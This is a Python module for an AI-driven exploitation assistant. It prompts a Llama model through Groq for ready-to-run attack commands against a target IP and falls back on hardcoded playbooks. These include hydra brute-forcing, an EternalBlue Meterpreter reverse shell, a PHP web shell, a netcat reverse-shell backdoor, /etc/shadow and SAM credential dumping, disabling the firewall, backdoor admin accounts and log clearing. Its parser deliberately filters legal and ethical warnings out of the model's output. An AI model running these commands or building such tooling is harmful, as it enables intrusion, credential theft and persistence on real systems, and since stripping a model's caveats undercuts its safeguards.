import os
from typing import Dict, List, Any
import json

# Try import groq, fallback to rule-based if not available
try:
    from groq import Groq
    GROQ_AVAILABLE = True
except ImportError:
    GROQ_AVAILABLE = False
    print("Groq not installed. Run: pip install groq")

class RealAIExploitAssistant:
    
    def __init__(self, api_key: str = None):
        self.api_key = api_key or os.getenv('GROQ_API_KEY')
        self.client = None
        
        if GROQ_AVAILABLE and self.api_key:
            try:
                self.client = Groq(api_key=self.api_key)
                print("Real AI (GROQ) initialized successfully!")
            except Exception as e:
                print(f"GROQ init failed: {e}")
                self.client = None
        else:
            print("GROQ not configured - AI features limited")
            self.client = None
    
    def generate_exploit_guidance(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """
        Generate exploit guidance using Real AI
        """
        
        # Check if GROQ AI is available
        if not self.client:
            return {
                'success': False,
                'error': 'GROQ AI not configured. Please set GROQ_API_KEY environment variable.',
                'steps': [],
                'tools': [],
                'commands': []
            }
        
        # Generate with GROQ
        try:
            return self._generate_with_groq(vulnerability)
        except Exception as e:
            return {
                'success': False,
                'error': f'GROQ API error: {str(e)}',
                'steps': [],
                'tools': [],
                'commands': []
            }
    
    def _generate_with_groq(self, vulnerability: Dict[str, Any]) -> Dict[str, Any]:
        """
        Generate exploitation guidance using GROQ AI
        """
        
        # Build prompt
        prompt = self._build_prompt(vulnerability)
        
        # Call GROQ API
        response = self.client.chat.completions.create(
            model="llama-3.3-70b-versatile",  # Fast & smart (Updated model)
            messages=[
                {
                    "role": "system",
                    "content": """You are an expert penetration tester and cybersecurity researcher. 
                    Provide detailed, step-by-step exploitation guidance for vulnerabilities.
                    Focus on educational content for authorized security testing only.
                    Always include warnings about legal and ethical considerations."""
                },
                {
                    "role": "user",
                    "content": prompt
                }
            ],
            temperature=0.7,
            max_tokens=2000
        )
        
        # Parse AI response
        ai_response = response.choices[0].message.content
        
        # Structure the response
        guidance = self._parse_ai_response(ai_response, vulnerability)
        
        return guidance
    
    def _build_prompt(self, vuln: Dict[str, Any]) -> str:
        """Build detailed prompt for AI"""
        
        # Extract target information
        target_ip = vuln.get('target_ip', vuln.get('ip', 'TARGET_IP'))
        target_port = vuln.get('port', 'PORT')
        
        prompt = f"""Analyze this vulnerability and provide READY-TO-USE exploitation commands:

**Target Information:**
- IP Address: {target_ip}
- Port: {target_port}
- Title: {vuln.get('title', 'Unknown')}
- Severity: {vuln.get('severity', 'UNKNOWN')}
- CVE: {vuln.get('cve', 'None')}
- Service: {vuln.get('service', 'Unknown')}
- Description: {vuln.get('description', 'No description')}

**SUPER CRITICAL: Commands section MUST contain ONLY executable commands!**

**FORMAT FOR COMMANDS SECTION - FOLLOW EXACTLY:**
In the "Commands" or "Ready-to-Execute Commands" section:
- Write ONLY the command itself
- NO descriptions before or after
- NO "Command to...", NO "This will...", NO "Tool:"
- Just pure executable code
- Example: telnet {target_ip} 23
- Example: nmap -p {target_port} {target_ip}
- Example: hydra -L users.txt telnet://{target_ip}

**Please provide:**

1. **Exploit Difficulty Assessment**
   - Rate: VERY EASY / EASY / MODERATE / HARD / VERY HARD
   - Brief explanation (1 sentence)

2. **Step-by-Step Exploitation Tutorial**
   - Provide DETAILED step-by-step guide
   - Include what each step accomplishes
   - Numbered steps from reconnaissance to exploitation
   - Make it beginner-friendly

3. **Ready-to-Execute Commands (PURE COMMANDS ONLY)**
   - Format: ONLY executable commands, ONE per line
   - CORRECT: nmap -p 23 {target_ip}
   - CORRECT: hydra -L users.txt -P pass.txt telnet://{target_ip}
   - CORRECT: telnet {target_ip} 23
   - WRONG: Telnet client: Usually pre-installed on most systems
   - WRONG: Explain why: This command does...
   - WRONG: Tool: Description here
   - NO descriptions, NO explanations, NO tool names with colons
   - ONLY pure executable commands with {target_ip} filled in

4. **Required Tools**
   - List all tools needed
   - Include installation commands if necessary

5. **Metasploit Modules**
   - Specific modules for this vulnerability
   - Include auxiliary and exploit modules

7. **Post-Exploitation**
   - What to do after successful exploit
   - Privilege escalation opportunities
   - Lateral movement strategies

8. **Mitigation & Defense**
   - How to fix this vulnerability
   - Detection methods
   - Prevention best practices

9. **References**
   - Relevant CVE links
   - ExploitDB references
   - Documentation

**Important:** This is for AUTHORIZED SECURITY TESTING ONLY. Include appropriate warnings.

Format your response clearly with sections."""
        
        return prompt
    
    def _parse_ai_response(self, ai_response: str, vuln: Dict) -> Dict[str, Any]:
        """
        Parse AI response into structured format
        """
        
        # Initialize structure
        guidance = {
            'vulnerability': vuln,
            'exploit_difficulty': 'MODERATE (AI Analysis)',
            'attack_vectors': [],
            'step_by_step': [],
            'tools_required': [],
            'commands': [],
            'metasploit_modules': [],
            'post_exploitation': [],
            'mitigation': '',
            'references': [],
            'warnings': [
                'EDUCATIONAL PURPOSE ONLY - Unauthorized access is illegal',
                'Always get written permission before testing',
                'AI-generated content - verify before use',
                'Follow local laws and regulations'
            ],
            'ai_raw_response': ai_response  # Keep full AI response
        }
        
        # DEBUG: Print AI response to see what we get
        print("\n" + "="*80)
        print("DEBUG: AI RAW RESPONSE")
        print("="*80)
        print(ai_response[:500])  # Print first 500 chars
        print("="*80 + "\n")
        
        # Try to extract structured data from AI response
        lines = ai_response.split('\n')
        current_section = None
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            # Detect sections
            if 'difficulty' in line.lower() and ':' in line:
                guidance['exploit_difficulty'] = line.split(':', 1)[1].strip()
            elif 'attack vector' in line.lower():
                current_section = 'attack_vectors'
            elif 'step' in line.lower() or 'exploitation guide' in line.lower():
                current_section = 'step_by_step'
            elif 'tool' in line.lower() and 'required' in line.lower():
                current_section = 'tools_required'
            elif 'command' in line.lower() or 'example' in line.lower():
                current_section = 'commands'
            elif 'metasploit' in line.lower():
                current_section = 'metasploit_modules'
            elif 'post-exploit' in line.lower() or 'post exploit' in line.lower():
                current_section = 'post_exploitation'
            elif 'mitigation' in line.lower() or 'defense' in line.lower():
                current_section = 'mitigation'
            elif 'reference' in line.lower():
                current_section = 'references'
            
            # Add to current section
            elif current_section and line.startswith(('-', '•', '*', '1.', '2.', '3.')):
                content = line.lstrip('-•*0123456789. ')
                
                # ULTRA-AGGRESSIVE FILTERING for commands section
                if current_section == 'commands':
                    # STEP 1: Skip if it's just description/explanation
                    description_indicators = [
                        'client:', 'tool:', 'service:', 'used for', 'pre-installed',
                        'usually', 'allows', 'enables', 'provides', 'helps',
                        'commonly', 'typically', 'often', 'can be', 'will be',
                        'is a', 'is an', 'are', 'was', 'were', 'has', 'have'
                    ]
                    if any(indicator in content.lower() for indicator in description_indicators):
                        # Only skip if it doesn't contain actual command
                        has_command = False
                        for cmd in ['nmap', 'telnet', 'ssh', 'hydra', 'msfconsole', 'mysql', 
                                   'python', 'nc ', 'curl', 'wget', 'exploit']:
                            if cmd + ' ' in content.lower() or content.lower().startswith(cmd):
                                has_command = True
                                break
                        if not has_command:
                            continue
                    
                    # STEP 2: Remove "Explain why:" or similar prefixes
                    prefixes_to_remove = [
                        'explain why:', 'explanation:', 'why:', 'purpose:', 
                        'this will:', 'this command:', 'description:', 'note:'
                    ]
                    for prefix in prefixes_to_remove:
                        if content.lower().startswith(prefix):
                            content = content[len(prefix):].strip()
                    
                    # STEP 3: Skip pure explanation lines
                    skip_patterns = [
                        'target system has', 'completely unencrypted', 'allows us to',
                        'permission', 'illegal', 'unauthorized', 'ethical', 'warning', 
                        'disclaimer', 'law', 'against the law', 'without permission',
                        'always ensure', 'follow', 'legal', 'guidelines', 'important:',
                        'remember', 'make sure', 'ensure that', 'be sure', 'careful',
                        'you should', 'you must', 'it is', 'this is', 'the target'
                    ]
                    if any(pattern in content.lower() for pattern in skip_patterns):
                        continue
                    
                    # STEP 4: Extract ONLY the command part (before any explanation)
                    command_indicators = ['nmap', 'msfconsole', 'hydra', 'sqlmap', 'nikto', 
                                        'gobuster', 'metasploit', 'exploit', 'ssh', 'telnet',
                                        'curl', 'wget', 'nc', 'netcat', 'python', 'perl', 'bash',
                                        'mysql', 'psql', 'mongo', 'ftp', 'enum4linux', 'smbclient',
                                        'rdesktop', 'xfreerdp', 'crackmapexec', 'impacket', 'use ',
                                        'set ', 'run', 'execute', 'search', 'show', 'cat ', 'ls ',
                                        'cd ', 'whoami', 'id', 'sudo', 'su ', 'chmod', 'chown']
                    
                    # Check if content contains a command
                    found_command = None
                    for cmd in command_indicators:
                        if cmd in content.lower():
                            # Extract from command start to end of actual command
                            cmd_start = content.lower().index(cmd)
                            found_command = content[cmd_start:]
                            
                            # Remove trailing explanations (after colon or sentence end)
                            sentence_endings = [': ', '. ', '! ', '? ', ' - ', ' (', ' which ', ' that ', ' to ', ' for ']
                            for ending in sentence_endings:
                                if ending in found_command and found_command.index(ending) > 5:
                                    found_command = found_command[:found_command.index(ending)]
                                    break
                            break
                    
                    if found_command:
                        # Final cleanup - remove backticks and extra spaces
                        found_command = found_command.replace('`', '').strip()
                        # Only add if it's actually a command (not just a word)
                        if len(found_command) > 3:
                            guidance[current_section].append(found_command)
                    
                elif current_section == 'mitigation':
                    guidance['mitigation'] += content + ' '
                elif current_section in guidance and isinstance(guidance[current_section], list):
                    guidance[current_section].append(content)
        
        # POST-PROCESSING: Clean AI commands more aggressively
        if guidance['commands']:
            cleaned_commands = []
            for cmd in guidance['commands']:
                # Remove any text before actual command
                # Look for command indicators at start
                cmd_lower = cmd.lower().strip()
                
                # Skip if it's pure description
                if any(x in cmd_lower for x in ['client:', 'tool:', 'service:', 'used for', 'this will', 'command to']):
                    # Try to extract command from the line
                    for indicator in ['telnet', 'nmap', 'ssh', 'hydra', 'msfconsole', 'mysql', 
                                    'python', 'nc ', 'curl', 'wget', 'exploit', 'use ', 'set ']:
                        if indicator in cmd_lower:
                            # Extract from indicator onwards
                            idx = cmd_lower.index(indicator)
                            cmd = cmd[idx:]
                            # Remove everything after colon or sentence ending
                            for ending in [': ', '. ', ' - ', ' (']:
                                if ending in cmd and cmd.index(ending) > 5:
                                    cmd = cmd[:cmd.index(ending)]
                                    break
                            break
                    else:
                        # No command found, skip this line
                        continue
                
                # Final cleanup
                cmd = cmd.replace('`', '').strip()
                
                # Only add if it looks like a real command
                if len(cmd) > 3 and any(c in cmd for c in [' ', '-', '/', ':']):
                    cleaned_commands.append(cmd)
            
            # Use cleaned commands if we got any, otherwise fallback
            if cleaned_commands:
                guidance['commands'] = cleaned_commands
            else:
                guidance['commands'] = self._generate_fallback_commands(vuln)
        else:
            # No commands from AI, use fallback
            guidance['commands'] = self._generate_fallback_commands(vuln)
        
        # FALLBACK: If no step-by-step found, generate tutorial
        if not guidance['step_by_step']:
            guidance['step_by_step'] = self._generate_exploitation_tutorial(vuln)
        
        return guidance
    
    def _generate_fallback_commands(self, vuln: Dict) -> List[str]:
        """
        Generate basic commands if AI doesn't provide them
        """
        commands = []
        target_ip = vuln.get('target_ip', vuln.get('ip', 'TARGET_IP'))
        port = vuln.get('port', '')
        service = vuln.get('service', '').lower()
        title = vuln.get('title', '').lower()
        
        # Database ports (MySQL, PostgreSQL, MongoDB, etc)
        if port in [3306, 5432, 27017, 1433, 5984] or 'database' in title or 'sql' in title:
            if port == 3306 or 'mysql' in service:
                commands.append(f"nmap -p 3306 --script mysql-info,mysql-enum,mysql-vuln-cve2012-2122 {target_ip}")
                commands.append(f"hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt mysql://{target_ip}")
                commands.append(f"mysql -h {target_ip} -u root -p")
            elif port == 5432 or 'postgres' in service:
                commands.append(f"nmap -p 5432 --script pgsql-brute {target_ip}")
                commands.append(f"psql -h {target_ip} -U postgres")
            elif port == 27017 or 'mongo' in service:
                commands.append(f"nmap -p 27017 --script mongodb-info,mongodb-databases {target_ip}")
                commands.append(f"mongo {target_ip}:27017")
        
        # SMB/Windows shares
        elif port == 445 or 'smb' in service or 'eternalblue' in title:
            commands.append(f"nmap -p 445 --script smb-vuln-ms17-010 {target_ip}")
            commands.append(f"enum4linux -a {target_ip}")
            commands.append(f"smbclient -L //{target_ip}/ -N")
            commands.append(f"msfconsole -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target_ip}; set payload windows/x64/meterpreter/reverse_tcp; set LHOST YOUR_IP; run\"")
        
        # SSH
        elif port == 22 or 'ssh' in service:
            commands.append(f"nc {target_ip} 22")
            commands.append(f"hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt ssh://{target_ip}")
            commands.append(f"ssh root@{target_ip}")
        
        # RDP
        elif port == 3389 or 'rdp' in service or 'bluekeep' in title:
            commands.append(f"nmap -p 3389 --script rdp-vuln-ms12-020 {target_ip}")
            commands.append(f"hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://{target_ip}")
            commands.append(f"rdesktop {target_ip}")
        
        # Web services
        elif port in [80, 443, 8080, 8443] or 'http' in service:
            protocol = 'https' if port in [443, 8443] else 'http'
            commands.append(f"nikto -h {protocol}://{target_ip}:{port}")
            commands.append(f"nikto -h {protocol}://{target_ip}:{port}")
            commands.append(f"gobuster dir -u {protocol}://{target_ip}:{port} -w /usr/share/wordlists/dirb/common.txt")
            commands.append(f"sqlmap -u \"{protocol}://{target_ip}:{port}/page?id=1\" --dbs --batch")
        
        # FTP
        elif port == 21 or 'ftp' in service:
            commands.append(f"ftp {target_ip}")
            commands.append(f"hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt ftp://{target_ip}")
            commands.append(f"nmap -p 21 --script ftp-anon,ftp-vuln-cve2010-4221 {target_ip}")
        
        # Telnet
        elif port == 23 or 'telnet' in service:
            commands.append(f"telnet {target_ip} 23")
            commands.append(f"nmap -p 23 --script telnet-brute,telnet-encryption {target_ip}")
            commands.append(f"hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt telnet://{target_ip}")
            commands.append(f"msfconsole -x \"use auxiliary/scanner/telnet/telnet_login; set RHOSTS {target_ip}; set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt; set PASS_FILE /usr/share/wordlists/rockyou.txt; run\"")
        
        # Generic fallback
        else:
            commands.append(f"nmap -p {port} -sV -sC --script vuln {target_ip}")
            commands.append(f"nmap -p {port} -sV {target_ip}")
        
        return commands if commands else [f"nmap -sV {target_ip}"]
    
    def _generate_exploitation_tutorial(self, vuln: Dict) -> List[str]:
        """
        Generate step-by-step exploitation tutorial
        """
        steps = []
        target_ip = vuln.get('target_ip', vuln.get('ip', 'TARGET_IP'))
        port = vuln.get('port', '')
        service = vuln.get('service', '').lower()
        title = vuln.get('title', '').lower()
        
        # Telnet Tutorial
        if port == 23 or 'telnet' in service or 'telnet' in title:
            steps = [
                f"**Step 1: Initial Connection Test**\nManual ly connect: `telnet {target_ip} 23`\nTry common credentials: admin/admin, root/root, telnet/telnet",
                f"**Step 2: Vulnerability Scanning**\nScan Telnet service: `nmap -p 23 --script telnet-brute,telnet-encryption {target_ip}`\nCheck if encryption is enabled (usually NOT for Telnet)",
                f"**Step 3: Credential Brute Force**\nLaunch Hydra attack: `hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt telnet://{target_ip}`\nWait for valid credentials",
                f"**Step 4: Traffic Capture (Optional)**\nStart Wireshark on your interface\nFilter for `tcp.port == 23`\nCapture credentials in plain text!",
                f"**Step 5: Exploitation**\nOnce credentials found, login: `telnet {target_ip} 23`\nEnter username and password\nYou now have shell access!",
                f"**Step 6: Post-Exploitation**\nEnumerate system: `uname -a`, `id`, `whoami`\nCheck for privilege escalation: `sudo -l`\nLook for sensitive files: `cat /etc/passwd`, `cat /etc/shadow`",
                f"**Step 7: Persistence (Optional)**\nCreate backdoor user: `useradd -m -s /bin/bash hacker`\nSet password: `passwd hacker`\nAdd to sudoers: `usermod -aG sudo hacker`"
            ]
        
        # Database Tutorial
        elif port in [3306, 5432, 27017] or 'database' in title or 'sql' in title:
            db_type = 'MySQL' if port == 3306 else 'PostgreSQL' if port == 5432 else 'MongoDB' if port == 27017 else 'Database'
            steps = [
                f"**Step 1: Service Enumeration**\nScan {db_type}: `nmap -p {port} -sV {target_ip}`\nIdentify exact version for exploit research",
                f"**Step 2: Anonymous Access Test**\nTry connecting without password\n{db_type}: Common default credentials",
                f"**Step 3: Brute Force Attack**\nUse Hydra to crack credentials\nTarget common usernames: root, admin, sa, postgres",
                f"**Step 4: Database Connection**\nOnce credentials found, connect to database\nEnumerate databases and tables",
                f"**Step 5: Data Extraction**\nDump sensitive data: user credentials, personal information\nExfiltrate important databases",
                f"**Step 6: Privilege Escalation**\nLook for UDF (User Defined Functions) vulnerabilities\nAttempt code execution through database",
                f"**Step 7: Persistence**\nCreate backdoor database user\nModify stored procedures for persistence"
            ]
        
        # SMB/EternalBlue Tutorial
        elif port == 445 or 'smb' in service or 'eternalblue' in title:
            steps = [
                f"**Step 1: Vulnerability Detection**\nScan for EternalBlue: `nmap -p 445 --script smb-vuln-ms17-010 {target_ip}`\nCheck if vulnerable",
                f"**Step 2: SMB Enumeration**\nList shares: `smbclient -L //{target_ip}/ -N`\nEnumerate users: `enum4linux -a {target_ip}`",
                f"**Step 3: Metasploit Setup**\nStart Metasploit: `msfconsole`\nLoad exploit: `use exploit/windows/smb/ms17_010_eternalblue`",
                f"**Step 4: Configure Exploit**\nSet target: `set RHOSTS {target_ip}`\nSet payload: `set payload windows/x64/meterpreter/reverse_tcp`\nSet your IP: `set LHOST YOUR_IP`",
                f"**Step 5: Launch Exploit**\nRun exploit: `exploit`\nWait for Meterpreter session",
                f"**Step 6: Post-Exploitation**\nGet system info: `sysinfo`\nElevate privileges: `getsystem`\nDump credentials: `hashdump`",
                f"**Step 7: Lateral Movement**\nScan network: `run arp_scanner`\nPivot to other machines\nMaintain persistence"
            ]
        
        # SSH Tutorial
        elif port == 22 or 'ssh' in service:
            steps = [
                f"**Step 1: Version Detection**\nCheck SSH version: `nc {target_ip} 22`\nResearch version-specific vulnerabilities",
                f"**Step 2: User Enumeration**\nEnum users (if vulnerable): `python3 ssh_enum.py {target_ip}`\nIdentify valid usernames",
                f"**Step 3: Brute Force Attack**\nLaunch Hydra: `hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://{target_ip}`\nUse found usernames",
                f"**Step 4: SSH Connection**\nConnect with found creds: `ssh user@{target_ip}`\nEnter password when prompted",
                f"**Step 5: Initial Enumeration**\nCheck permissions: `sudo -l`\nList files: `ls -la /home/user`\nCheck cron jobs: `cat /etc/crontab`",
                f"**Step 6: Privilege Escalation**\nSearch for SUID binaries: `find / -perm -4000 2>/dev/null`\nCheck kernel version: `uname -a`\nLook for exploits",
                f"**Step 7: Persistence**\nAdd SSH key: `echo 'your_public_key' >> ~/.ssh/authorized_keys`\nCreate backdoor: `nc -e /bin/bash your_ip 4444`"
            ]
        
        # RDP Tutorial
        elif port == 3389 or 'rdp' in service or 'bluekeep' in title:
            steps = [
                f"**Step 1: BlueKeep Detection**\nScan for CVE-2019-0708: `nmap -p 3389 --script rdp-vuln-ms12-020 {target_ip}`\nCheck vulnerability status",
                f"**Step 2: Brute Force RDP**\nAttack RDP: `hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://{target_ip}`\nTry common accounts",
                f"**Step 3: RDP Connection**\nConnect: `rdesktop {target_ip}` or `xfreerdp /v:{target_ip} /u:administrator`\nEnter credentials",
                f"**Step 4: Initial Access**\nOpen command prompt as admin\nDisable firewall: `netsh advfirewall set allprofiles state off`",
                f"**Step 5: Enumeration**\nList users: `net user`\nCheck privileges: `whoami /priv`\nFind sensitive files",
                f"**Step 6: Credential Dumping**\nExtract SAM: `reg save HKLM\\SAM sam.hiv`\nExtract SYSTEM: `reg save HKLM\\SYSTEM system.hiv`\nCrack offline",
                f"**Step 7: Persistence**\nCreate admin user: `net user hacker Password123! /add`\nAdd to admins: `net localgroup administrators hacker /add`"
            ]
        
        # Web Server Tutorial
        elif port in [80, 443, 8080, 8443] or 'http' in service:
            steps = [
                f"**Step 1: Web Reconnaissance**\nScan web server: `nikto -h http://{target_ip}:{port}`\nIdentify technologies",
                f"**Step 2: Directory Discovery**\nEnum directories: `gobuster dir -u http://{target_ip}:{port} -w /usr/share/wordlists/dirb/common.txt`\nFind hidden paths",
                f"**Step 3: SQL Injection Testing**\nTest for SQLi: `sqlmap -u 'http://{target_ip}:{port}/page?id=1' --dbs`\nDump databases if vulnerable",
                f"**Step 4: File Upload Testing**\nFind upload forms\nTry uploading web shell: `<?php system($_GET['cmd']); ?>`\nAccess: `/uploads/shell.php?cmd=whoami`",
                f"**Step 5: XSS Testing**\nTest reflected XSS: `<script>alert(1)</script>`\nTest stored XSS in comments/forms",
                f"**Step 6: Exploitation**\nGet reverse shell via web shell\nUpgrade to stable shell: `python -c 'import pty; pty.spawn(\"/bin/bash\")'`",
                f"**Step 7: Post-Exploitation**\nFind database credentials in config files\nEscalate privileges\nMaintain access"
            ]
        
        # FTP Tutorial
        elif port == 21 or 'ftp' in service:
            steps = [
                f"**Step 1: Anonymous FTP Test**\nConnect: `ftp {target_ip}`\nUsername: `anonymous`\nPassword: `anonymous@email.com`",
                f"**Step 2: FTP Enumeration**\nList files: `ls -la`\nCheck permissions: Look for writable directories",
                f"**Step 3: Brute Force**\nIf anonymous fails: `hydra -L users.txt -P passwords.txt ftp://{target_ip}`",
                f"**Step 4: File Upload**\nIf writable: `put backdoor.php`\nUpload web shell or malware",
                f"**Step 5: Download Sensitive Files**\nDownload: `get /etc/passwd`\nExtract configuration files",
                f"**Step 6: Exploitation**\nAccess uploaded shell via web\nOr execute uploaded binary",
                f"**Step 7: Persistence**\nModify FTP config for persistent access\nCreate backdoor user"
            ]
        
        # Generic fallback
        else:
            steps = [
                f"**Step 1: Service Detection**\nScan service: `nmap -p {port} -sV -sC {target_ip}`\nIdentify service and version",
                f"**Step 2: Vulnerability Research**\nSearch exploits: `searchsploit service_name version`\nCheck CVE databases",
                f"**Step 3: Exploit Selection**\nFind working exploit\nDownload and review code",
                f"**Step 4: Exploit Execution**\nRun exploit against target\nAdjust parameters as needed",
                f"**Step 5: Post-Exploitation**\nGain initial access\nEnumerate system\nEscalate privileges",
                f"**Step 6: Lateral Movement**\nScan internal network\nCompromise additional systems",
                f"**Step 7: Cleanup & Persistence**\nClear logs\nMaintain access\nDocument findings"
            ]
        
        return steps
    
    def get_ai_chat_response(self, question: str, context: str = "") -> str:
        """
        General AI chat for vulnerability questions
        """
        if not self.client:
            return "AI chat not available. Please configure GROQ API key."
        
        try:
            response = self.client.chat.completions.create(
                model="llama-3.3-70b-versatile",
                messages=[
                    {
                        "role": "system",
                        "content": """You are a cybersecurity expert specializing in penetration testing 
                        and vulnerability exploitation. Provide clear, educational answers for 
                        authorized security testing purposes only."""
                    },
                    {
                        "role": "user",
                        "content": f"{context}\n\nQuestion: {question}"
                    }
                ],
                temperature=0.7,
                max_tokens=1000
            )
            
            return response.choices[0].message.content
        except Exception as e:
            return f"AI Error: {str(e)}"
    
    def get_metasploit_modules(self, vulnerability: Dict[str, Any]) -> List[Dict[str, str]]:
        """
        Get Metasploit modules recommendations using Real AI or fallback
        """
        
        # Try Real AI first
        if self.client:
            try:
                vuln_name = vulnerability.get('name', 'Unknown')
                cve = vulnerability.get('cve', '')
                port = vulnerability.get('port', '')
                service = vulnerability.get('service', '')
                
                prompt = f"""List Metasploit Framework modules that can be used to exploit this vulnerability:
                
Vulnerability: {vuln_name}
CVE: {cve}
Port: {port}
Service: {service}

Provide a JSON array of modules with format:
[
  {{
    "module": "exploit/windows/smb/ms17_010_eternalblue",
    "rank": "excellent",
    "description": "Brief description"
  }}
]

Only return the JSON array, nothing else."""

                response = self.client.chat.completions.create(
                    model="llama-3.3-70b-versatile",
                    messages=[
                        {"role": "system", "content": "You are a Metasploit Framework expert. Return only valid JSON."},
                        {"role": "user", "content": prompt}
                    ],
                    temperature=0.3,
                    max_tokens=500
                )
                
                try:
                    result = response.choices[0].message.content
                    # Extract JSON from response
                    if '```json' in result:
                        result = result.split('```json')[1].split('```')[0].strip()
                    elif '```' in result:
                        result = result.split('```')[1].split('```')[0].strip()
                    
                    modules = json.loads(result)
                    return modules if isinstance(modules, list) else []
                except Exception as parse_error:
                    print(f"JSON parsing error: {parse_error}")
                    return []
                    
            except Exception as e:
                print(f"Real AI MSF modules error: {e}")
                return []
        
        # No AI available
        return []
    
    def generate_pentest_checklist(self, target_ip: str, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """
        Generate penetration testing checklist using Real AI or fallback
        """
        
        # Try Real AI first
        if self.client:
            try:
                vuln_summary = "\n".join([
                    f"- {v.get('name', 'Unknown')} (Port: {v.get('port', 'N/A')})"
                    for v in vulnerabilities[:5]  # Limit to avoid token limits
                ])
                
                prompt = f"""Create a penetration testing checklist for target IP: {target_ip}

Vulnerabilities found:
{vuln_summary}

Provide a structured JSON checklist with format:
{{
  "reconnaissance": ["step1", "step2"],
  "scanning": ["step1", "step2"],
  "exploitation": ["step1", "step2"],
  "post_exploitation": ["step1", "step2"],
  "reporting": ["step1", "step2"]
}}

Only return the JSON object, nothing else."""

                response = self.client.chat.completions.create(
                    model="llama-3.3-70b-versatile",
                    messages=[
                        {"role": "system", "content": "You are a penetration testing expert. Return only valid JSON."},
                        {"role": "user", "content": prompt}
                    ],
                    temperature=0.5,
                    max_tokens=800
                )
                
                try:
                    result = response.choices[0].message.content
                    # Extract JSON from response
                    if '```json' in result:
                        result = result.split('```json')[1].split('```')[0].strip()
                    elif '```' in result:
                        result = result.split('```')[1].split('```')[0].strip()
                    
                    checklist = json.loads(result)
                    return checklist
                except Exception as parse_error:
                    print(f"JSON parsing error: {parse_error}")
                    return {'phases': [], 'total_checks': 0}
                    
            except Exception as e:
                print(f"Real AI checklist error: {e}")
                return {'phases': [], 'total_checks': 0}
        
        # No AI available
        return {'phases': [], 'total_checks': 0}


# Global instance
real_ai_assistant = None

def initialize_real_ai(api_key: str = None):
    """Initialize real AI assistant"""
    global real_ai_assistant
    real_ai_assistant = RealAIExploitAssistant(api_key)
    return real_ai_assistant

def get_real_ai_guidance(vulnerability: Dict) -> Dict:
    """Get exploit guidance from Real AI"""
    global real_ai_assistant
    
    if not real_ai_assistant:
        real_ai_assistant = RealAIExploitAssistant()
    
    return real_ai_assistant.generate_exploit_guidance(vulnerability)

def ask_ai_question(question: str, context: str = "") -> str:
    """Ask AI a question about vulnerability"""
    global real_ai_assistant
    
    if not real_ai_assistant:
        real_ai_assistant = RealAIExploitAssistant()
    
    return real_ai_assistant.get_ai_chat_response(question, context)
